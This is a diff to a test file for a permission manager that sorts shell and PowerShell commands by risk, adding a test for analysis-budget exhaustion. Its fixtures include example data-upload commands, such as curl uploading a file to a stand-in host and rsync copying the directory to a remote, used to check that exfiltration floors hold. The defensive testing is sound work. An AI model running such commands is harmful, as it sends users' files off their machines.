@@ -1,3 +1,4 @@
+import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js";
 import { createHash } from "node:crypto";
 import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
@@ -5,7 +6,7 @@ import { dirname, join } from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { SHELL_ANALYSIS_LIMITS } from "../../shared/shell-parser.js";
 import { aveHome } from "../../shared/ave-home.js";
-import { PermissionManager } from "../permission-manager.js";
+import { PermissionManager, type PermissionRule } from "../permission-manager.js";
 import { updatePermissionsFile } from "../permissions-store.js";
 import { canonicalizePathForMatch, SENSITIVE_PATH_ENTRIES } from "../sensitive-paths.js";
 import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
@@ -160,6 +161,8 @@ const INNER_UPLOADS = [
   "npm exec --call='curl -T file http://e'",
 ];
 
+const BUDGET_CASES = DECISION_CASES.filter((row) => row.why === "floor analysis budget exhaustion prevents automatic execution without a sandbox");
+
 const FLOOR_CASES = [
   ...DECISION_CASES.filter((row) => row.bucket === "floor"),
   ...[...INNER_UPLOADS, "npx rsync -a . remote:/x"].flatMap((command) => DIALECTS.map((dialect) => ({ command, dialect }))),
@@ -179,7 +182,7 @@ describe("shared runner decisions", () => {
       const expectations = RUNNER_DECISIONS.map((row) => row.dialects?.[dialect] ?? row);
       const counts = dialect === "bash"
         ? { floor: 288, ordinary: 1655, normal: 88 }
-        : { floor: 321, ordinary: 1611, normal: 99 };
+        : { floor: 317, ordinary: 1615, normal: 99 };
       for (const bucket of ["floor", "ordinary", "normal"] as const) {
         expect(expectations.filter((row) => row.bucket === bucket)).toHaveLength(counts[bucket]);
       }
@@ -246,12 +249,23 @@ describe("shared runner decisions", () => {
     await reloaded.loadRulesFromFile();
     expectBucket(checkCommand(reloaded, dialect, command), bucket);
     const ruled = runnerManager();
-    ruled.setRules([{ pattern: actionKey(dialect, command), action: "allow" }]);
+    ruled.setRules(([{ pattern: actionKey(dialect, command), action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
     expectBucket(checkCommand(ruled, dialect, command), bucket);
   });
 
   it.each(FLOOR_CASES)("keeps a credential or sink floor above saved grants and allow rules in $dialect: $command", ({ command, dialect }) => {
     expectBucket(checkCommand(floorManagers.get(dialect)!, dialect, command), "floor");
+  });
+
+  it.each(BUDGET_CASES)("closes both execution lanes on actual analysis exhaustion: $command", async ({ command, dialect }) => {
+    expect(dialect).toBe("powershell");
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ analysisLimited: true, sensitive: null, exfiltration: null });
+    const manager = runnerManager();
+    expectBucket(checkCommand(manager, dialect, command), "ordinary");
+    expect(checkCommand(manager, dialect, command, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
+    expectBucket(checkCommand(manager, dialect, command), "ordinary");
+    expect(checkCommand(manager, dialect, command, true)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
   });
 
   it.each(INNER_UPLOADS)("retains the actual inner upload reason: %s", (command) => {
